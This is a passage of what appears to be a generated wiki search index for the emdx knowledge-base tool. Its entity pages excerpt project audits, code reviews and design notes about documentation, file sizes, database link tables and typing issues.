str</code></li> <li><code>core.py:edit()</code> - <code>identifier: str</code></li> <li> <p><code>tags.py:add()</code> - `doc_id...</p> </li> <li> <p>#6213 Delegate: PR #452 Auto-Linking Depth Bug Fix   Section: Bugs Identified</p> <p>Buggy code:</p> </li> </ul> <pre><code>child_links = [l for l in child_links if l.doc_id != doc_id]\n</code></pre> <ul> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: delegate.py - Execution Creation Flow</p> <p>...mpt=prompt[:500],        task_type=\"single\",        status=\"active\",        source_doc_id=source_doc_id,        parent_task_id=parent_task_id,        seq=seq,        tags=\",\".join(tags) if tags else None,    )    ```</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...--|------|-------------| | <code>id</code> | INTEGER PK | Auto-incrementing execution ID | | <code>doc_id</code> | INTEGER | Optional document being executed | | <code>doc_title</code> | TEXT | Title for the execution | | <code>status</code> | TEXT | running/completed/failed | | <code>started_at</code> | TIME...</p> </li> </ul>"},{"location":"entities/docid/#apiinterface-inconsistencies","title":"API/Interface Inconsistencies","text":"Issue Locations <code>doc_id</code> typed as both <code>int</code> and <code>str</code> 5 commands Tag input format differs (<code>comma-separated</code> vs <code>List[str]</code>) 3 commands Silent failures with `except Exception:..."},{"location":"entities/docid/#1-inconsistent-id-types","title":"1. Inconsistent ID Types","text":"<p>Location: Multiple commands Issue: <code>doc_id</code> is typed inconsistently - sometimes <code>int</code>, sometimes <code>str</code></p>"},{"location":"entities/docid/#related-entities","title":"Related Entities","text":"<ul> <li><code>doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.5)</li> <li><code>current</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>keep any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>json.dumps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>exec_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>paramspec</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>unpack</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.5)</li> <li><code>list[str]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.5)</li> <li><code>working_dir</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.3)</li> <li><code>get_preview_content()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.3)</li> </ul>"},{"location":"entities/docs/","title":"docs","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2025-07-12</p>"},{"location":"entities/docs/#documents-8","title":"Documents (8)","text":"<ul> <li>#6591 Delegate: Research what an 'emdx init' command should do for first-run [2/4]   Section: What emdx init Should Do <ol> <li>Auto-detect existing database</li> </ol> </li> <li>If database exists: \"\u2713 Knowledge base already exists (589 docs). Nothing to do.\"</li> <li> <p>No destructive actions ever</p> </li> <li> <p>#6528 Delegate: Review GitHub PR #650 using 'gh pr view 650' and 'gh pr diff [3/4]   Section: Issues &amp; Suggestions</p> </li> </ul> <pre><code># qa_presenter.py line 183\ndef _retrieve(self, question: str, limit: int = 8) -&gt; tuple[list[tuple], str]:\n</code></pre> <p>The <code>list[tuple]</code> is untype...</p> <ul> <li>#6467 emdx distill Command Implementation   Section: Core Components <p>...age, and model used</p> </li> <li><code>Audience</code> enum defines three modes: <code>ME</code> (personal notes), <code>DOCS</code> (documentation), <code>COWORKERS</code> (team briefings)</li> <li>Audience-specific system prompts tailor output style and tone</li> <li> <p>Uses lazy-loaded Anthropic client with import guards...</p> </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> <p>...ss for AI-powered document synthesis</p> </li> <li><code>Audience</code> enum with three modes: <code>ME</code>, <code>DOCS</code>, <code>COWORKERS</code></li> <li><code>SynthesisResult</code> dataclass for tracking synthesis output and token usage</li> <li> <p>Uses Claude Sonnet API via anthropic SDK (optional dependency)    -...</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Human Patterns</p> <p>Discovery Flow:</p> </li> <li>Often browse first, then narrow</li> <li>Use tags for coarse filtering: <code>--tags \"security,active\"</code></li> <li>Follow relationships (parent/child docs)</li> <li> <p>Read snippets before full view</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Motivation</p> <p>...ant to share curated findings with coworkers but currently lack a way to:</p> </li> <li>Filter docs by quality (not just relevance)</li> <li>Synthesize multiple documents into a coherent brief</li> <li>Adapt output for different audiences (self vs team vs docs)</li> <li> <p>Output in a for...</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Project-Specific Tags</p> </li> <li><code>feature</code> - New feature development</li> <li><code>bugfix</code> - Bug resolution</li> <li><code>refactor</code> - Code improvement</li> <li><code>docs</code> - Documentation</li> <li><code>testing</code> - Test-related work</li> <li> <p><code>infra</code> - Infrastructure/tooling</p> </li> <li> <p>#6812 Delegate: Fix DOC-9: Update docs/architecture.md to reflect v0.20.0 TU [4/5]   Section: Changes to <code>docs/architecture.md</code></p> <p>...three-tier dashboard: RUNNING (active executions), TASKS (ready/active), DOCS (recent history)</p> </li> <li>Described <code>ActivityDataLoader</code> deduplication logic (tasks with <code>execution_id</code> skip duplicates; <code>output_doc_id</code> removes duplicate documents)</li> <li>Ad...</li> </ul>"},{"location":"entities/docs/#5-missing-type-hint-for-docs-return-minor","title":"5. Missing Type Hint for <code>docs</code> Return (Minor)","text":""},{"location":"entities/docs/#technical-categories","title":"Technical Categories","text":""},{"location":"entities/docs/#related-entities","title":"Related Entities","text":"<ul> <li><code>mental model</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>coworkers</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>auth summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>--save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>--for</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>bugfix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>tests/test_distill.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>lazy_subcommands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>poetry run mypy</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>compact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/docscli-apimd/","title":"docs/cli-api.md","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/docscli-apimd/#documents-12","title":"Documents (12)","text":"<ul> <li>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3] <p>Now I have all the data I need. Here's the complete audit:</p> </li> </ul>"},{"location":"entities/docscli-apimd/#docs-audit-results","title":"Docs Audit Results","text":""},{"location":"entities/docscli-apimd/#docscli-apimd_1","title":"docs/cli-api.md","text":"<p>1. STALE: <code>emdx save</code> content priority order is wrong (line 14) Doc says: <code>stdin &gt; --file &gt; positional argument</code> Actual (`emdx save --hel...</p> <ul> <li>#6614 Delegate: Update documentation to remove all references to emoji alias   Section: Changes Made </li> <li>Removed \"using text aliases\" from save/find tag option descriptions</li> <li>Removed \"using intuitive text aliases\" from <code>emdx tag add</code> description</li> <li> <p>Changed \"Add tags us...</p> </li> <li> <p>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made</p> </li> <li>Removed the \"Dynamic Discovery\" section with examples</li> <li>Removed <code>--each</code> and <code>--do</code> from the Options Reference table</li> <li> <p>Removed the <code>--each requires --do</code> note</p> </li> <li> <p>#6173 Delegate: Audit docs/ directory for accuracy. For EACH file in docs/ ( [7/17]   Section: docs/ Directory Accuracy Audit</p> </li> <li> <p>#6868 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/docscli-apimd/#docscli-apimd_2","title":"docs/cli-api.md","text":""},{"location":"entities/docscli-apimd/#docscli-apimd_3","title":"docs/cli-api.md","text":""},{"location":"entities/docscli-apimd/#docscli-apimd_4","title":"docs/cli-api.md","text":"<p>Status: \u26a0\ufe0f ISSUES FOUND</p>"},{"location":"entities/docscli-apimd/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: Summary</p> <p>Updated <code>docs/cli-api.md</code> with all missing commands and removed stale documentation. PR: https://github.com/arockwell/emdx/pull/803</p> <ul> <li>#6867 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/docscli-apimd/#synthes-24","title":"Synthes [2/4]","text":"<p>Section: Summary</p> <p>Changes to <code>docs/cli-api.md</code> (net -74 lines):</p> <ul> <li>#6865 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/docscli-apimd/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Summary</p> <p>Removed all dead group system documentation from <code>docs/cli-api.md</code>:</p> <ul> <li>#6843 Delegate: Fold the stale top-level command into maintain. Move stale l <p>...ted all CLI invocations from <code>[\"stale\", ...]</code> to <code>[\"maintain\", \"stale\", ...]</code></p> </li> <li><code>docs/cli-api.md</code> \u2014 Updated staleness tracking section headers and examples</li> <li> <p><code>CHANGELOG.md</code> \u2014 Updated historical reference to use new command paths</p> </li> <li> <p>#6813 Delegate: Fix DOC-8: Update docs/cli-api.md TUI keyboard shortcuts sec [3/5]   Section: Summary</p> <p>Updated <code>docs/cli-api.md</code> TUI keyboard shortcuts section (lines 718-729) from a flat 10-item list to organized per-screen sections with 50+ bindings:</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary</p> <p>Changes made to <code>docs/cli-api.md</code>:</p> </li> <li> <p>#6810 Delegate: Fix DOC-6: Update docs/cli-api.md with new task commands fro [1/5]   Section: Summary</p> <p>Updated <code>docs/cli-api.md</code> with three new documentation sections for v0.20.0 task commands:</p> </li> </ul>"},{"location":"entities/docscli-apimd/#related-entities","title":"Related Entities","text":"<ul> <li><code>summary updated</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>stale</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>options reference</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>no python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx task chain</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx tag add</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx maintain wikify</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx maintain entities</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx maintain cleanup-dirs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>document groups</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/documentbrowserpy/","title":"document_browser.py","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2026-01-10</p>"},{"location":"entities/documentbrowserpy/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6436 Any/None typing audit [5/5]</p> <p>| Suggested Replacement | |----------|----------|-----------|--------------|----------------------| | <code>DocumentPreviewModal.__init__</code> | L328 | <code>**kwargs: Any</code> | \u274c No | Screen passthrough | | <code>_doc_data</code> | L331 | <code>dict[str, Any] \\| None</code> | \u2705 Yes | `Do...</p> </li> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/architecture.md</p> <p>28. STALE: Architecture references <code>document_browser.py</code> (line 133) The \"Document Browser\" section references <code>document_browser.py</code> bindings but this file doesn't exist. The document browser has likely been replaced by the Activity View.</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: Files with Most Issues</p> <ol> <li><code>cascade.py</code> (commands + database) \u2014 12 issues</li> </ol> </li> <li><code>document_browser.py</code> \u2014 10 issues</li> <li><code>documents.py</code> \u2014 8 issues</li> <li><code>migrations.py</code> \u2014 6 issues</li> <li> <p><code>unified_executor.py</code> \u2014 5 issues</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 6: No UI Mixins (NOT ADDRESSED)</p> <p>Current State: No <code>ui/mixins/</code> directory exists. Browsers still large:</p> </li> <li><code>activity_view.py</code>: 1175 lines</li> <li> <p><code>document_browser.py</code>: 1122 lines</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Critical Issues (Address First)</p> <ol> <li>Monolithic files need decomposition:</li> </ol> </li> <li><code>migrations.py</code>: 2200 lines (39 migrations in one file)</li> <li><code>activity_view.py</code>: 1175 lines</li> <li><code>document_browser.py</code>: 1122 lines</li> <li><code>maintain.py</code>: 1098 lines</li> <li> <p><code>core.py</code>: 876 lines</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2502 \u2502 \u251c\u2500\u2500 cascade/      Cascade stage views                        \u2502 \u2502 \u2514\u2500\u2500 document_browser.py (1122 lines)                        \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 ```</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 1: Exception Handling &amp; Error Management</p> <p>...* across 18 files</p> </li> <li>Highest concentration: <code>ui/search/search_screen.py</code> (5), <code>ui/document_browser.py</code> (3), <code>ui/cascade/cascade_view.py</code> (3)</li> <li> <p>These silently swallow errors, making debugging extremely difficult</p> </li> <li> <p>#6176 Delegate: Audit emdx/ui/ for dead TUI code. Check ALL ui/ files includ [5/17]   Section: 7. Stub ViewModels Module</p> <p><code>emdx/ui/viewmodels/__init__.py</code> contains stub classes with a comment: \"This module was deleted in PR #300 but is still imported by document_browser.py.\"</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 4: Large Files Indicating Architectural Strain</p> <p>...| | <code>migrations.py</code> | 1,340 | All migrations in one file, missing docstrings | | <code>document_browser.py</code> | 1,147 | Mixed UI/business logic, no tests | | <code>commands/core.py</code> | 1,082 | Many command handlers, inconsistent error patterns |</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Summary of Tech Debt Findings</p> <p>...pass<code>blocks** - Silently swallowing errors throughout the UI code, especially in</code>document_browser.py<code>,</code>pulse_browser.py<code>, and</code>smart_list.py`</p> </li> <li> <p>Exception swallowing in critical paths - <code>document_executor.py</code> has nested silent exception handling that could leav...</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...- command_palette/palette_screen.py: Debug log file write failures logged</p> </li> <li>document_browser.py: Status bar and preview widget failures logged</li> <li>log_browser_display.py: Error display and status update failures logged</li> <li>modals.py: Markdown rendering fa...</li> </ul>"},{"location":"entities/documentbrowserpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>merge git utilities</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>log_browser_display.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>fix this sprint</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>duplicate truncate functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>create ui mixins</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>this sprint</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>search/search_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>metrics summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>markdown_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>log_browser_navigation.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/documentlinks/","title":"document_links","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-13</p>"},{"location":"entities/documentlinks/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/architecture.md</p> <p>24. MISSING: <code>database/document_links.py</code> not listed (line 46-52) The <code>database/document_links.py</code> file exists but isn't in the architecture tree.</p> </li> <li> <p>#6724 Wiki Generation Architecture Research [9/10]   Section: 3. Source Attribution</p> <p>Embed <code>&lt;!-- wiki-sources: 42, 55 --&gt;</code> comments during synthesis. Parse into <code>document_links</code> with method <code>wiki_source</code>. Integrates with existing link graph and <code>emdx view --links</code>.</p> </li> <li> <p>#6722 Wiki Generation Architecture Research \u2014 Static Site Options   Section: Context</p> <p>...ntity_service.py` \u2014 Layer 3: entity extraction + IDF-weighted cross-referencing</p> </li> <li><code>document_links</code> table \u2014 bidirectional knowledge graph (source/target/score/method)</li> <li><code>document_entities</code> table \u2014 extracted entities per document (type, confidence)</li> <li> <p>FTS5 full-text...</p> </li> <li> <p>#6719 Wiki Generation Quality Assessment &amp; Feedback Loops   Section: Source Attribution (Inline Citation)</p> <p>During synthesis, instruct the LLM to note which source doc contributed each section:</p> </li> </ul> <pre><code>End each section with: &lt;!-- wiki-sources: 42, 55, 67 --&gt;\n</code></pre> <p>Parse these comments out and store in <code>document_links</code> with method='wiki_source'.</p> <ul> <li>#6717 Wiki Generation Architecture Research [4/10]   Section: Current Infrastructure (already exists) <p>...e.py:257-280`), emdx already:</p> </li> <li>Runs title-match wikification (Layer 1) \u2192 creates <code>document_links</code> with <code>method='title_match'</code></li> <li> <p>Extracts entities + entity-match wikification (Layer 3) \u2192 creates <code>document_entities</code> and <code>document_links</code> with `method='entity_match'...</p> </li> <li> <p>#6716 Wiki Generation Architecture Research [8/10]   Section: Key Decisions</p> <p>...aph integration | New <code>method</code> values (<code>wiki_source</code>, <code>wiki_related</code>) in existing <code>document_links</code> | | Staleness | Content hash comparison on save \u2014 O(1) per document update | | Migration | Single #045, no data backfill needed |...</p> </li> <li> <p>#6713 wiki-schema-research   Section: Current Schema Inventory (Relevant Tables)</p> <p>..., stage | | <code>documents_fts</code> | FTS5 full-text search | title, content, project | | <code>document_links</code> | Knowledge graph edges | source_doc_id, target_doc_id, similarity_score, method | | <code>document_entities</code> | Entity extraction (Layer 3) | document_id, entity, entity...</p> </li> <li> <p>#6693 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Problem Summary</p> <p>Three link methods feed into one <code>document_links</code> table:</p> </li> <li> <p>#6690 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Current State</p> <p>Three link methods feed a single <code>document_links</code> table:</p> </li> <li> <p>#6147 Delegate: Review PR #452 (Auto-Linking). Run: gh pr diff 452. Check co [5/7]   Section: Gameplan Alignment \u2705</p> <p>...s | |---------------------|-------------------|--------| | Links metadata table | <code>document_links</code> table with migration #36 | \u2705 | | Post-save hook (--auto-link) | <code>emdx save --auto-link</code> flag | \u2705 | | Display links on view | <code>emdx view</code> shows \"Related docs:\" | \u2705 |...</p> </li> <li> <p>#6143 Delegate: Read gameplan by running: emdx view 6098. Implement the Auto [2/7]   Section: What Was Built</p> </li> <li>Added <code>document_links</code> table with bidirectional links and similarity scores</li> <li>Foreign keys to documents table with CASCADE on delete</li> <li>Indexes for efficient source/target/score queries</li> </ul>"},{"location":"entities/documentlinks/#database-migration-migration_036","title":"Database Migration (migration_036)","text":""},{"location":"entities/documentlinks/#related-entities","title":"Related Entities","text":"<ul> <li><code>wiki_source</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>title matches</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>source-stale</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>similarity_score desc</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>method document links</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>maintain compact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>link_all()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>get_links()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>generation_prompt_hash</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>find_similar_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/documentmergerpy/","title":"document_merger.py","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/documentmergerpy/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6434 Any/None typing audit [4/5]</p> <p>| Suggested Replacement | |----------|--------------|--------------|----------------------| | <code>get_orphaned_cascade_executions()</code> | Return <code>list[dict[str, Any]]</code> | \u2705 Yes | <code>list[OrphanedExecutionRow]</code> TypedDict | | <code>monitor_execution_completion()</code> | ...</p> </li> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Common Themes</p> <p>...ure code that was never wired up** \u2014 Entire service APIs exist with zero callers: <code>document_merger.py</code> (merge strategies), <code>health_monitor.py</code> (health reports), <code>auto_tagger.py</code> (batch tagging, custom patterns), <code>execution_monitor.py</code> (zombie cleanup). These were lik...</p> </li> <li> <p>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/documentmergerpy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...---------------|-------------------|---------------|-----------------| | <code>services/document_merger.py</code> | <code>suggest_merge_strategy</code> | NO | no | nowhere | | <code>services/document_merger.py</code> | <code>execute_merge</code> | NO | no | nowhere | | <code>services/document_merger.py</code>...</p> <ul> <li>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Checklist </li> <li>[x] Add constants to <code>config/constants.py</code></li> <li>[x] Extend <code>document_merger.py</code> with cluster grouping</li> <li> <p>[x] Implement union-find algorithm for clustering</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> <p>...| <code>emdx/commands/compact.py</code> | NEW | CLI command implementation | | <code>emdx/services/document_merger.py</code> | EXTEND | Add <code>group_clusters()</code> method | | <code>emdx/config/constants.py</code> | EXTEND | Add <code>COMPACT_*</code> constants | | <code>emdx/main.py</code> | EXTEND | Register command | | `tes...</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Implementation Tasks</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>...---------| | <code>duplicate_detector.py:1-504</code> | 504 | Find exact/near duplicates | | <code>document_merger.py:1-503</code> | 503 | Merge similar documents | | <code>similarity.py</code> | (shared) | TF-IDF for both |</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...ask_service.py*: All 2 necessary</p> </li> <li>synthesis_service.py: All 2 necessary</li> <li>document_merger.py: All 5 necessary</li> <li>embedding_service.py: All 1 necessary</li> <li>log_stream.py: All 1 necessary</li> <li>health_monitor.py: All 2 necessary</li> <li> <p>**duplicate_detector.p...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   